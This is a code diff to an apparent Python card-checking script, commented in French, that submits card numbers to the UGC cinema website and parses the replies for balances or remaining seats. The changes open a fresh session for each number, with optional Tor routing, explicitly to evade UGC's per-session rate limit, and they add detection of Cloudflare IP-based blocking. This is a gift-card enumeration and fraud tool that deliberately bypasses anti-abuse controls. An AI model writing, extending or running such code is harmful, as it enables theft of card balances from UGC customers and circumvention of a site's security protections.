@@ -49,8 +49,10 @@ CARD_FIELD  = "cardNumber"
 HIDDEN_BASE = {"page": "30013", "type": "ugc"}
 
 # confirmé en live: réponse page pour carte invalide
-ERROR_KW   = ["le type de carte est inconnu", "type de carte est inconnu",
+ERROR_KW    = ["le type de carte est inconnu", "type de carte est inconnu",
                "introuvable","invalide","incorrect","numéro incorrect","carte inconnue"]
+# réponse de rate-limit session (pas une vraie erreur carte)
+SESSION_LIMIT_KW = ["une demande a déjà été envoyée", "momentanément indisponible"]
 # carte valide → UGC affiche le solde (montant €, ou nb places)
 SUCCESS_KW = ["votre solde","solde :", "places restantes","votre carte est valide",
                "crédit disponible","valable jusqu"]
@@ -98,10 +100,16 @@ ACTION_VARIANTS = [
 ]
 
 def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> dict:
+    """
+    UGC rate-limite par session: 1 check max par cookie.
+    → on crée une session NEUVE pour chaque numéro.
+    """
     num = str(num).strip()
+    # ── session fraîche à chaque appel (contourne le "une demande a déjà été envoyée") ──
+    fresh_sess = make_sess(tor=(sess.proxies.get("https","").startswith("socks") if hasattr(sess,"proxies") else False))
     try:
         # ── étape 1: GET page pour seed session + récupérer form réel ──────────
-        r0 = sess.get(PAGE_URL, timeout=15, allow_redirects=True,
+        r0 = fresh_sess.get(PAGE_URL, timeout=15, allow_redirects=True,
                       headers={"Referer": "https://www.ugc.fr/"})
         if r0.status_code == 429:
             return {"num": num, "valid": None, "balance": None, "details": "RATE_LIMITED"}
@@ -114,12 +122,11 @@ def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> di
 
         for form in soup0.find_all("form"):
             inp_names = [i.get("name","").lower() for i in form.find_all("input")]
+            # cherche le form carte: soit "cardnumber", "numerocarte", ou "carte"
             if any("card" in n or "carte" in n or "numero" in n for n in inp_names):
-                # forme action → URL absolue
                 fa = form.get("action","").strip()
                 if fa:
                     use_action = ("https://www.ugc.fr" + fa) if not fa.startswith("http") else fa
-                # récupère tous les hidden
                 payload = {}
                 for inp in form.find_all("input"):
                     t  = inp.get("type","").lower()
@@ -128,7 +135,12 @@ def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> di
                         continue
                     if t == "hidden":
                         payload[nm] = inp.get("value","")
-                    if "card" in nm.lower() or "carte" in nm.lower() or "numero" in nm.lower():
+                    # détecte le champ texte carte (cardNumber, numeroCarte, etc.)
+                    nm_low = nm.lower()
+                    if t not in ("hidden","submit","button") and (
+                        "card" in nm_low or "carte" in nm_low or
+                        "numero" in nm_low or "number" in nm_low
+                    ):
                         use_field = nm
                 break
 
@@ -142,13 +154,12 @@ def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> di
             "Content-Type": "application/x-www-form-urlencoded",
         }
 
-        # essaie d'abord l'action parsée, puis les variantes Struts2
         candidates = [use_action] + [v for v in ACTION_VARIANTS if v != use_action]
         r = None
         for candidate in candidates:
             try:
-                r = sess.post(candidate, data=payload, timeout=15,
-                              allow_redirects=True, headers=post_headers)
+                r = fresh_sess.post(candidate, data=payload, timeout=15,
+                                    allow_redirects=True, headers=post_headers)
                 if r.status_code != 404:
                     break
             except Exception:
@@ -166,6 +177,10 @@ def check_card(num: str, sess, action: str, hidden: dict, card_field: str) -> di
 
         low  = r.text.lower()
         soup = BeautifulSoup(r.text, "html.parser")
+
+        # rate-limit session même avec session fraîche (Cloudflare IP-based)
+        if any(k in low for k in SESSION_LIMIT_KW):
+            return {"num": num, "valid": None, "balance": None, "details": "RATE_LIMITED"}
 
         if any(k in low for k in ERROR_KW):
             return {"num": num, "valid": False, "balance": None, "details": "carte invalide"}
